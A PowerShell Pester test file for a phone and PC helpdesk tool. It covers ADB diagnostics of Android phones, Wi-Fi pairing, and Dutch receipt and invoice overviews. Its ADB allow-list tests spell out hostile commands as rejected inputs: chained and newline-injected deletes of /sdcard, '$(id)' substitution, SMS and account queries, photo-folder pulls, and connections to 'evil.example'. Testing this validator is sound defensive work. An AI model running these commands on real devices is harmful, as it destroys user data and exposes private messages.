        (Test-HcPhoneBattery (New-FakePhone @{ ScreenTimeoutMs = 600000 })).FindingId | Should Be 'phoneScreenLong'
    }

    It 'finds a wrong date, the cause of a failing Google sign-in' {
        $script:Lang = 'en'
        $r = Test-HcPhoneOnline (New-FakePhone @{ ClockOffsetSec = -3 * 86400; AutoTime = '0' })
        $r.FindingId | Should Be 'phoneClockWrong'
        $r.FindingArgs[0] | Should Be '3 days'
        @($r.Actions | ForEach-Object { $_.FixId }) -contains 'phoneAutoTime' | Should Be $true
        (Test-HcPhoneOnline (New-FakePhone @{ AutoTime = '0' })).FindingId | Should Be 'phoneAutoTimeOff'
        (Test-HcPhoneOnline (New-FakePhone @{ AutoZone = '0' })).FindingId | Should Be 'phoneAutoZoneOff'
    }

    It 'finds the connection problems in order' {
        (Test-HcPhoneOnline (New-FakePhone @{ Airplane = '1'; WifiOn = '0'; MobileData = '0'; PingIp = $false })).FindingId | Should Be 'airplaneOn'
        (Test-HcPhoneOnline (New-FakePhone @{ WifiOn = '0'; MobileData = '0'; PingIp = $false })).FindingId | Should Be 'phoneNoNetwork'
        (Test-HcPhoneOnline (New-FakePhone @{ PingIp = $false; PingName = $false })).FindingId | Should Be 'phoneNoInternet'
        (Test-HcPhoneOnline (New-FakePhone @{ PingName = $false })).FindingId | Should Be 'phoneDnsFail'
        $r = Test-HcPhoneOnline (New-FakePhone @{ PingName = $false; PrivateDns = 'hostname'; PrivateDnsHost = 'dns.example.com' })
        $r.FindingId | Should Be 'privateDnsBroken'
        @($r.Actions)[0].FixId | Should Be 'privateDnsAuto'
        @($r.Actions)[0].Target.Label | Should Be 'dns.example.com'
        (Test-HcPhoneOnline (New-FakePhone @{ PingIp = $null; PingName = $null })).FindingId | Should Be 'phoneOnlineOk'
    }

    It 'has a finding, advice and steps for every finding id, in both languages' {
        $source = [IO.File]::ReadAllText((Join-Path $root 'src\checks\android.ps1'))
        $ids = @([regex]::Matches($source, "\`$[Ff]ound\['(\w+)'\]|Set-HcFinding \`$\w+ '(\w+)'|(?m)Select-HcFinding .* '(\w+)'\s*$") | ForEach-Object {
            @($_.Groups[1].Value, $_.Groups[2].Value, $_.Groups[3].Value) | Where-Object { $_ }
        } | Sort-Object -Unique)
        $ids += @($script:PhoneDebugFindings.Values)
        $ids.Count | Should BeGreaterThan 25
        foreach ($lang in 'en', 'nl') {
            foreach ($id in $ids) {
                foreach ($kind in 'finding', 'advice', 'steps') {
                    $have = [bool]$script:Strings[$lang]["$kind.$id"]
                    "$lang $kind.$id $have" | Should Be "$lang $kind.$id True"
                }
            }
        }
    }

    It 'prints every report without a missing text' {
        foreach ($lang in 'en', 'nl') {
            $script:Lang = $lang
            foreach ($facts in @((New-FakePhone), (New-FakePhone @{ ClockOffsetSec = 7200; AutoTime = '0'; DataFreeKB = 5000000; PingName = $false; PrivateDns = 'hostname'; PrivateDnsHost = 'x.example' }))) {
                foreach ($test in 'Test-HcPhoneOverview', 'Test-HcPhoneSlow', 'Test-HcPhoneStorage', 'Test-HcPhoneBattery', 'Test-HcPhoneOnline', 'Test-HcPhoneUpdates', 'Test-HcPhoneSafety') {
                    $r = & $test $facts
                    $all = @('finding.' + $r.FindingId) + @($r.FindingArgs)
                    $texts = @($r.Results | ForEach-Object { $_.Text }) + @(T @all) + @($r.Actions | ForEach-Object { T ('fix.' + $_.FixId) $_.Target.Label })
                    ($texts -join ' ') | Should Not Match '\[[a-z]+\.[\w.]+\]'
                }
            }
        }
        $script:Lang = 'en'
    }

    It 'only lets the allowed ADB commands through' {
        foreach ($ok in 'devices -l', 'kill-server', 'shell getprop', 'shell settings get global auto_time', 'shell settings get system screen_off_timeout',
                        'shell settings put global auto_time 1', 'shell settings put global adb_enabled 0', 'shell settings put global private_dns_mode opportunistic',
                        'shell dumpsys battery', 'shell cat /proc/meminfo', 'shell df -k /data', 'shell date +%s', 'shell pm list packages -3',
                        'shell ping -c 1 -W 3 google.com', 'shell am start -a android.settings.INTERNAL_STORAGE_SETTINGS') {
            "$ok $(Test-HcAdbAllowed $ok)" | Should Be "$ok True"
        }
        foreach ($bad in 'shell getprop; rm -rf /sdcard', "shell getprop`nrm -rf /sdcard", "shell getprop`n", 'shell rm -rf /sdcard', 'install x.apk', 'shell cat /sdcard/DCIM/a.jpg',
                         'shell settings put global adb_enabled 1', 'shell settings put secure location_mode 0', 'shell settings get secure android_id',
                         'shell content query --uri content://sms', 'shell dumpsys account', 'shell getprop | sh', 'shell am start -a android.intent.action.VIEW -d http://x',
                         'shell ping -c 1 -W 3 evil.example', 'pull /sdcard/DCIM', 'shell settings get global $(id)', 'shell df -k /data && reboot', 'SHELL GETPROP') {
            "$bad $(Test-HcAdbAllowed $bad)" | Should Be "$bad False"
        }
        { Invoke-HcAdb 'shell rm -rf /sdcard' } | Should Throw
        # The tools: one fixed screenshot file, a plain restart, nothing more.
        foreach ($ok in 'shell screencap -p /sdcard/housecall-screen.png', 'pull /sdcard/housecall-screen.png housecall-screen.png',
                        'shell rm /sdcard/housecall-screen.png', 'reboot', 'shell getprop sys.boot_completed') {
            "$ok $(Test-HcAdbAllowed $ok)" | Should Be "$ok True"
        }
        foreach ($bad in 'pull /sdcard/DCIM housecall-screen.png', 'pull /sdcard/housecall-screen.png C:/x.png', 'shell rm /sdcard/DCIM',
                         'shell rm -rf /sdcard/housecall-screen.png', 'reboot bootloader', 'reboot recovery', 'shell screencap -p /sdcard/DCIM/x.png') {
            "$bad $(Test-HcAdbAllowed $bad)" | Should Be "$bad False"
        }
    }

    It 'reads the Wi-Fi pairing input' {
        $p = ConvertFrom-HcPairInput ' 192.168.1.50:41235   482915 '
        "$($p.Address) $($p.Port) $($p.Code)" | Should Be '192.168.1.50 41235 482915'
        $c = ConvertFrom-HcPairInput '192.168.1.50:38497'
        $c.Code | Should Be $null
        # Only the code: Housecall finds the address on the network itself.
        $only = ConvertFrom-HcPairInput ' 482915 '
        "$($only.Address)|$($only.Code)" | Should Be '|482915'
        "$(New-HcPairCheck $only)" | Should Be "Invoke-HcPairCheck '' 0 '482915'"
        $svc = @(ConvertFrom-HcMdnsServices "List of discovered mdns services`nadb-R58N12ABCDE-AbCdEf`t_adb-tls-pairing._tcp.`t192.168.1.50:41235`nadb-R58N12ABCDE-AbCdEf`t_adb-tls-connect._tcp.`t192.168.1.50:38497`nother`t_googlecast._tcp.`t192.168.43.5:8009")
        $svc.Count | Should Be 2
        "$($svc[0].Kind) $($svc[0].Address):$($svc[0].Port)" | Should Be 'pairing 192.168.1.50:41235'
        $svc[1].Kind | Should Be 'connect'
        Test-HcAdbAllowed 'mdns services' | Should Be $true
        foreach ($bad in '192.168.1.50 482915', '192.168.1.50:41235 48291', '999.1.1.1:5555', 'evil.example:5555 123456', '192.168.1.2:99999', "192.168.1.2:5555 123456; reboot", '') {
            "[$bad] $([bool](ConvertFrom-HcPairInput $bad))" | Should Be "[$bad] False"
        }
        "$(New-HcPairCheck $p)" | Should Be "Invoke-HcPairCheck '192.168.1.50' 41235 '482915'"
        "$(New-HcPairCheck $c)" | Should Be "Invoke-HcPairCheck '192.168.1.50' 38497 ''"
        New-HcPairCheck $null | Should Be $null
    }

    It 'reports what pairing and connecting over Wi-Fi did' {
        $req = [pscustomobject]@{ Address = '192.168.1.50'; Port = 41235; Code = '482915' }
        $out = { param($pair, $connect, $serial, $already = $false) [pscustomobject]@{ PairText = $pair; ConnectText = $connect; Serial = $serial; Already = $already; NotFound = $false; Address = $null; Port = 0 } }
        $none = [pscustomobject]@{ PairText = $null; ConnectText = $null; Serial = $null; Already = $false; NotFound = $true; Address = $null; Port = 0 }
        (Test-HcPairOutcome ([pscustomobject]@{ Address = $null; Port = 0; Code = '482915' }) $none).Report.FindingId | Should Be 'pairNotFound'
        $found = [pscustomobject]@{ PairText = 'Successfully paired to 192.168.1.50:41235'; ConnectText = $null; Serial = 'adb-R58-x._adb-tls-connect._tcp'; Already = $false; NotFound = $false; Address = '192.168.1.50'; Port = 41235 }
        $s = Test-HcPairOutcome ([pscustomobject]@{ Address = $null; Port = 0; Code = '482915' }) $found
        $s.Ok | Should Be $true
        (@($s.Report.Results | ForEach-Object { $_.Text }) -join ' ') | Should Match '192\.168\.1\.50:41235'
        $s = Test-HcPairOutcome $req (& $out 'Failed: Wrong password or connection was dropped.' $null $null)
        $s.Ok | Should Be $false
        $s.Report.FindingId | Should Be 'pairFailed'
        (Test-HcPairOutcome $req (& $out 'Successfully paired to 192.168.1.50:41235 [guid=adb-R58-x]' $null $null)).Report.FindingId | Should Be 'pairedNoConnect'
        (Test-HcPairOutcome $req (& $out 'Successfully paired to 192.168.1.50:41235 [guid=adb-R58-x]' $null 'adb-R58-x._adb-tls-connect._tcp')).Ok | Should Be $true
        $conn = [pscustomobject]@{ Address = '192.168.1.50'; Port = 38497; Code = $null }
        (Test-HcPairOutcome $conn (& $out $null "failed to connect to '192.168.1.50:38497': Connection refused" $null)).Report.FindingId | Should Be 'connectFailed'
        (Test-HcPairOutcome $conn (& $out $null 'connected to 192.168.1.50:38497' '192.168.1.50:38497')).Ok | Should Be $true
        (Test-HcPairOutcome $conn (& $out $null 'already connected to 192.168.1.50:38497' '192.168.1.50:38497')).Ok | Should Be $true
        (Test-HcPairOutcome $req (& $out $null $null 'adb-R58-x._adb-tls-connect._tcp' $true)).Ok | Should Be $true
        Test-HcWifiSerial '192.168.1.50:38497' | Should Be $true
        Test-HcWifiSerial 'adb-R58N12ABCDE-AbCd._adb-tls-connect._tcp' | Should Be $true
        Test-HcWifiSerial 'R58N12ABCDE' | Should Be $false
        foreach ($ok in 'pair 192.168.1.50:41235 482915', 'connect 192.168.1.50:38497', 'shell settings put global adb_wifi_enabled 0') {
            "$ok $(Test-HcAdbAllowed $ok)" | Should Be "$ok True"
        }
        foreach ($bad in 'connect evil.example:5555', 'pair 192.168.1.50:41235 12345', 'shell settings put global adb_wifi_enabled 1', 'tcpip 5555', 'disconnect') {
            "$bad $(Test-HcAdbAllowed $bad)" | Should Be "$bad False"
        }
    }

    It 'has every text of the phone tab, in both languages' {
        $source = [IO.File]::ReadAllText((Join-Path $root 'src\window-phone.ps1'))
        $keys = @([regex]::Matches($source, "T '(ph\.[\w.]+)'") | ForEach-Object { $_.Groups[1].Value })
        $keys += @($script:HcPhoneTiles | ForEach-Object { "ph.tile.$_" })
        $keys += @($script:HcPhoneTools + 'phoneDebugOff' | ForEach-Object { "ph.$_" })
        $keys.Count | Should BeGreaterThan 30
        foreach ($lang in 'en', 'nl') {
            foreach ($key in ($keys | Sort-Object -Unique)) { "$lang $key $([bool]$script:Strings[$lang][$key])" | Should Be "$lang $key True" }
        }
    }

    It 'shows four figures on the device card, with the checks'' limits' {
        $script:Lang = 'en'
        $figs = @(Get-HcPhoneFigures (New-FakePhone))
        $figs.Count | Should Be 4
        (@($figs | ForEach-Object { $_.Level }) -join ',') | Should Be 'ok,ok,ok,ok'
        $figs[0].Value | Should Be '51 GB free'
        $figs[2].Value | Should Be '80%, not plugged in'
        $figs = @(Get-HcPhoneFigures (New-FakePhone @{ UptimeSec = 15 * 86400; DataFreeKB = 9000000 }))
        $figs[0].Level | Should Be 'warn'
        $figs[3].Level | Should Be 'warn'
        $figs[3].Value | Should Be '15 days ago'
        @(Get-HcPhoneFigures (New-FakePhone @{ DataTotalKB = $null; RamKB = $null; Battery = $null; UptimeSec = $null })).Count | Should Be 0
    }

    It 'offers the tools on the overview, and a restart where it helps' {
        $ids = @((Test-HcPhoneOverview (New-FakePhone)).Actions | ForEach-Object { $_.FixId })
        ($ids -join ',') | Should Be 'phoneMirror,phoneScreenshot,phoneRestart,phoneDebugOff'
        @((Test-HcPhoneSlow (New-FakePhone @{ UptimeSec = 20 * 86400 })).Actions | ForEach-Object { $_.FixId }) -contains 'phoneRestart' | Should Be $true
        @((Test-HcPhoneSlow (New-FakePhone)).Actions | ForEach-Object { $_.FixId }) -contains 'phoneRestart' | Should Be $false
        $script:ScrcpySha256 | Should Match '^[0-9a-f]{64}$'
        $script:ScrcpyZipUrl | Should Match '^https://github\.com/Genymobile/scrcpy/releases/download/v[\d.]+/scrcpy-win64-v[\d.]+\.zip$'
    }

    It 'reads the output of adb' {
        $devices = @(ConvertFrom-HcAdbDevices "List of devices attached`r`nR58N12ABCDE            device usb:1-1 product:a52qnsxx model:SM_A525F device:a52q transport_id:1`r`nemulator-5554 unauthorized`r`n`r`n")
        $devices.Count | Should Be 2
        $devices[0].Model | Should Be 'SM A525F'
        $devices[1].State | Should Be 'unauthorized'
        @(ConvertFrom-HcAdbDevices "* daemon not running; starting now at tcp:5037`nList of devices attached`n").Count | Should Be 0

        $props = ConvertFrom-HcGetprop "[ro.product.model]: [SM-A525F]`n[ro.build.version.security_patch]: [2026-08-01]`n[empty]: []"
        $props['ro.product.model'] | Should Be 'SM-A525F'
        $props['empty'] | Should Be ''

        $mem = ConvertFrom-HcMeminfo "MemTotal:        5832104 kB`nMemFree:          212345 kB`nMemAvailable:    2104832 kB"
        $mem.TotalKB | Should Be 5832104
        $mem.AvailableKB | Should Be 2104832

        (ConvertFrom-HcDf "Filesystem      1K-blocks     Used Available Use% Mounted on`n/dev/block/dm-6 110000000 60000000  50000000  55% /data").FreeKB | Should Be 50000000
        (ConvertFrom-HcDf "Filesystem 1K-blocks Used Available Use% Mounted on`n/dev/block/bootdevice/by-name/userdata`n 25000000 24000000 1000000 96% /data").TotalKB | Should Be 25000000
        ConvertFrom-HcDf 'df: /data: Permission denied' | Should Be $null

        $sizes = ConvertFrom-HcDiskstats "Latency: 2ms [512B Data Write]`nData-Free: 50000000K / 110000000K total = 45% free`nApp Size: 6000000000`nApp Data Size: 3000000000`nPhotos Size: 12000000000`nVideos Size: 8000000000"
        $sizes['photos'] | Should Be 12000000000
        $sizes['appData'] | Should Be 3000000000
        $sizes.Contains('audio') | Should Be $false

        $b = ConvertFrom-HcBattery "Current Battery Service state:`n  AC powered: false`n  USB powered: true`n  status: 2`n  health: 2`n  level: 64`n  temperature: 312`n  Charge counter: 2900000"
        $b.Level | Should Be 64
        $b.TempC | Should Be 31.2
        $b.Plugged | Should Be $true
        $b.Cycles | Should Be $null
        (ConvertFrom-HcBattery "  level: 50`n  cycle count: 512").Cycles | Should Be 512

        ConvertFrom-HcPing "1 packets transmitted, 1 received, 0% packet loss, time 0ms" | Should Be $true
        ConvertFrom-HcPing "1 packets transmitted, 0 received, 100% packet loss, time 0ms" | Should Be $false
        ConvertFrom-HcPing "ping: unknown host google.com" | Should Be $false
        ConvertFrom-HcPing "ping: socket: Operation not permitted" | Should Be $null
        ConvertFrom-HcPing $null | Should Be $null
    }

    It 'names the device the way its owner knows it' {
        Get-HcPhoneName @{ 'ro.product.manufacturer' = 'samsung'; 'ro.product.model' = 'SM-A525F' } | Should Be 'Samsung SM-A525F'
        Get-HcPhoneName @{ 'ro.product.manufacturer' = 'Xiaomi'; 'ro.product.model' = '23021RAA2Y'; 'ro.product.marketname' = 'Redmi Note 12' } | Should Be 'Xiaomi Redmi Note 12'
        Get-HcPhoneName @{ 'ro.product.manufacturer' = 'Google'; 'ro.product.model' = 'Pixel 8' } | Should Be 'Google Pixel 8'
        Get-HcPhoneName @{ 'ro.product.manufacturer' = 'Google'; 'ro.product.model' = 'Google Pixel 8' } | Should Be 'Google Pixel 8'
        $s24 = @{ 'ro.product.manufacturer' = 'samsung'; 'ro.product.model' = 'SM-S928B' }
        Get-HcPhoneName $s24 'Galaxy S24 Ultra' | Should Be 'Samsung Galaxy S24 Ultra (SM-S928B)'
        Get-HcPhoneName $s24 'Telefoon van Gerda' | Should Be 'Telefoon van Gerda (Samsung SM-S928B)'
        Get-HcPhoneName $s24 'SM-S928B' | Should Be 'Samsung SM-S928B'
        Get-HcPhoneName $s24 '' | Should Be 'Samsung SM-S928B'
        Get-HcPhoneName @{ 'ro.product.manufacturer' = 'Google'; 'ro.product.model' = 'Pixel 8' } 'Pixel 8' | Should Be 'Google Pixel 8'
        (ConvertFrom-HcBattery "  level: 57`n  cycle count: 0").Cycles | Should Be $null
    }

    It 'has a handler for every M problem, and keeps the phone out of this PC''s history' {
        foreach ($code in $script:Areas['M']) { $script:ProblemHandlers[$code] | Should Not BeNullOrEmpty }
        $script:HcVisit.Clear()
        [void]$script:HcVisit.Add([pscustomobject]@{ Code = 'A1'; FindingId = 'allGood'; FindingArgs = @() })
        [void]$script:HcVisit.Add([pscustomobject]@{ Code = 'M5'; FindingId = 'phoneClockWrong'; FindingArgs = @('3 days') })
        $body = New-HcVisitBody ([pscustomobject]@{ Os = 'Windows 11 Home' }) '' '' ('a' * 64)
        @($body.problems | ForEach-Object { $_.code }) -join ',' | Should Be 'A1'
        $script:HcVisit.Clear()
    }
}

Describe 'Kept documents and the overview (7 Oct)' {
    . (Join-Path $root 'tools\overview.ps1') -NoWindow
    $docs = @(
        [pscustomobject]@{ id = '1'; created_at = '2026-10-07T12:20:00Z'; kind = 'receipt'; client_name = 'Mevr. de Vries'; total = 32.5; payment = 'pin' }
        [pscustomobject]@{ id = '2'; created_at = '2026-10-05T10:00:00Z'; kind = 'invoice'; invoice_number = '2026-0003'; client_name = 'Dhr. Bakker; zoon'; total = 65; payment = 'tikkie' }
        [pscustomobject]@{ id = '3'; created_at = '2026-10-05T09:00:00Z'; kind = 'note'; client_name = 'Dhr. Bakker' }
        [pscustomobject]@{ id = '4'; created_at = '2026-09-13T12:00:00Z'; kind = 'invoice'; invoice_number = '2026-0002'; client_name = 'Mevr. de Vries'; total = 40; payment = 'tikkie' }
    )

    It 'keeps a one-page document one page, printed by the worker (8 Oct: a receipt came out a page per line)' {
        $saved = $script:HcWin
        try {
            $fin = New-HcFinishState
            $fin.Mode = 'receipt'; $fin.Name = 'Test'
            $fin.Settings = [pscustomobject]@{ business_name = 'X'; start_fee = 15; start_minutes = 30 }
            $script:HcWin = @{ Fin = $fin; Queue = New-Object System.Collections.ArrayList }
            Mock Update-HcVisit { }
            Start-HcDocSave
            $job = $script:HcWin.Queue[0]
            $job.Kind | Should Be 'pdf'
            $job.DocKind | Should Be 'receipt'
            @($job.Body.Pages).Count | Should Be 1
            @($job.Body.Pages[0]).Count | Should BeGreaterThan 5
            $fin.Stage | Should Be 'working'
        } finally { $script:HcWin = $saved }
    }

    It 'reads the history again after this visit is saved (8 Oct: a list opened earlier stayed old)' {
        $saved = $script:HcWin
        try {
            $script:HcWin = @{ Fin = (New-HcFinishState); Hist = @{ Stage = 'list'; Visits = @(); Notice = $null } }
            Mock Get-HcRelayResult { [pscustomobject]@{ Ok = $true; Data = [pscustomobject]@{ id = 7 } } }
            Mock Update-HcFinishBar { }
            Mock Update-HcFinishPanel { }
            Complete-HcVisitSaved @{} @() $null @()
            $script:HcWin.Fin.Saved | Should Be $true
            $script:HcWin.Hist.Stage | Should Be 'new'
        } finally { $script:HcWin = $saved }
    }

    It 'offers Alle klanten only where the housecall command is installed (Shamil''s own devices)' {
        $savedLocal = $env:LOCALAPPDATA
        $fake = Join-Path $env:TEMP ('hc-own-' + [guid]::NewGuid().ToString('N'))
        try {
            $env:LOCALAPPDATA = $fake
            Test-HcOwnDevice | Should Be $false
            New-Item -ItemType Directory -Path (Join-Path $fake 'Microsoft\WindowsApps') -Force | Out-Null
            Set-Content -LiteralPath (Join-Path $fake 'Microsoft\WindowsApps\housecall.cmd') -Value '@echo off'
            Test-HcOwnDevice | Should Be $true
        } finally {
            $env:LOCALAPPDATA = $savedLocal
            Remove-Item -LiteralPath $fake -Recurse -Force -ErrorAction SilentlyContinue
        }
    }

    It 'keeps Alle klanten apart from this PC''s history and the client''s name' {
        $saved = $script:HcWin; $savedToken = $script:HcToken
        try {
            $fin = New-HcFinishState
            $script:HcWin = @{ Fin = $fin; PcId = ('a' * 64); Queue = New-Object System.Collections.ArrayList
                Hist = @{ Stage = 'list'; Visits = @('mine'); Docs = @(); Notice = $null; Scope = 'all'; AllStage = 'new'; AllVisits = @(); AllDocs = @() } }
            $script:HcToken = 'x.y'
            Start-HcHistoryLoad
            $job = $script:HcWin.Queue[0]
            $job.Body.all | Should Be $true
            $job.Scope | Should Be 'all'
            $script:HcWin.Hist.AllStage | Should Be 'loading'
            $script:HcWin.Hist.Stage | Should Be 'list'

            Mock Update-HcOther { }
            Mock Get-HcRelayResult { [pscustomobject]@{ Ok = $true; Data = [pscustomobject]@{
                visits = @([pscustomobject]@{ id = 1; pc = ('b' * 64); label = 'Mevr. de Vries' }); documents = @() } } }
            Complete-HcHistory $job @() $null @()
            $script:HcWin.Hist.AllStage | Should Be 'list'
            @($script:HcWin.Hist.AllVisits).Count | Should Be 1
            @($script:HcWin.Hist.Visits) | Should Be @('mine')
            "$($fin.Name)" | Should Be ''
        } finally { $script:HcWin = $saved; $script:HcToken = $savedToken }
    }

    It 'says the day lock in words' {
        Get-HcRelayMessage 'locked_day' | Should Match 'dag|day'
    }

    It 'groups the documents per month with the money in it (notes count nothing)' {
        $months = @(ConvertTo-HcOverviewMonths $docs)
        $months.Count | Should Be 2
        $months[0].Title | Should Be 'Oktober 2026'
        $months[0].Total | Should Be ([decimal]97.5)
        @($months[0].Rows).Count | Should Be 3
        $months[0].Rows[1].Kind | Should Be 'Factuur 2026-0003'
        $months[0].Rows[1].Payment | Should Be 'betaalverzoek'
        $null -eq $months[0].Rows[2].Amount | Should Be $true
        $months[1].Total | Should Be ([decimal]40)
        Format-HcOverviewMoney ([decimal]1234.5) | Should Be ([string][char]0x20AC + ' 1.234,50')
        @(ConvertTo-HcOverviewMonths @()).Count | Should Be 0
    }

    It 'writes a CSV that Dutch Excel reads, and safe file names' {
        $csv = @(ConvertTo-HcOverviewCsv (ConvertTo-HcOverviewMonths $docs))
        $csv[0] | Should Be 'Datum;Soort;Klant;Bedrag;Betaling'
        $csv[1] | Should Be '2026-10-07;Betaalbewijs;Mevr. de Vries;32,50;pin'
        $csv[2] | Should Be '2026-10-05;Factuur 2026-0003;"Dhr. Bakker; zoon";65,00;betaalverzoek'
        $csv[3] | Should Be '2026-10-05;Briefje;Dhr. Bakker;;'
        $csv.Count | Should Be 5
        $row = [pscustomobject]@{ Kind = 'Betaalbewijs'; When = [datetime]'2026-10-07'; Client = 'A/B: "C"' }
        Get-HcOverviewFileName $row | Should Be 'Betaalbewijs 2026-10-07 AB C.pdf'
    }

    It 'sends what the PDF is about with it, and shows it in one line' {
        $script:Lang = 'nl'
        $script:HcToken = 'token'
        $settings = [pscustomobject]@{ hourly_rate = 30; start_fee = 25; start_minutes = 30; callout_fee = 0; btw_mode = 'unset' }
        $fin = New-HcFinishState
        $fin.Settings = $settings; $fin.Minutes = 45; $fin.Callout = $false; $fin.Payment = 'cash'; $fin.Mode = 'receipt'; $fin.VisitId = 12
        $body = New-HcDocBody $fin 'receipt' ([byte[]](37, 80, 68, 70)) ('a' * 64) 'Mevr. de Vries'
        $body.action | Should Be 'doc_save'
        $body.id | Should Be $fin.DocId
        $body.kind | Should Be 'receipt'
        $body.total | Should Be 32.5
        $body.payment | Should Be 'cash'
        $body.visit_id | Should Be 12
        $body.client_name | Should Be 'Mevr. de Vries'
        $body.pdf_base64 | Should Be 'JVBERg=='
        $fin.Invoice = [pscustomobject]@{ total = 65; payment = 'tikkie'; number = '2026-0003'; client_name = 'Dhr. Bakker' }
        $body = New-HcDocBody $fin 'invoice' ([byte[]](37)) ('a' * 64) 'Iemand anders'
        $body.invoice_number | Should Be '2026-0003'
        $body.client_name | Should Be 'Dhr. Bakker'
        $body.total | Should Be 65
        $body = New-HcDocBody $fin 'note' ([byte[]](37)) $null ''
        $null -eq $body.total -and $null -eq $body.payment -and $null -eq $body.client_name | Should Be $true
        (New-HcFinishState).DocId | Should Not Be $fin.DocId
        $dot = '  ' + [char]0x00B7 + '  '
        Format-HcDocLine ([pscustomobject]@{ kind = 'receipt'; total = 32.5; payment = 'pin' }) | Should Be ('Betaalbewijs' + $dot + [char]0x20AC + ' 32,50' + $dot + 'pin')
        Format-HcDocLine ([pscustomobject]@{ kind = 'invoice'; invoice_number = '2026-0003'; total = 65; payment = 'tikkie' }) | Should Be ('factuur 2026-0003' + $dot + [char]0x20AC + ' 65,00' + $dot + 'betaalverzoek')
        Format-HcDocLine ([pscustomobject]@{ kind = 'note'; total = $null; payment = $null }) | Should Be 'Briefje'
        $script:HcToken = $null
    }
}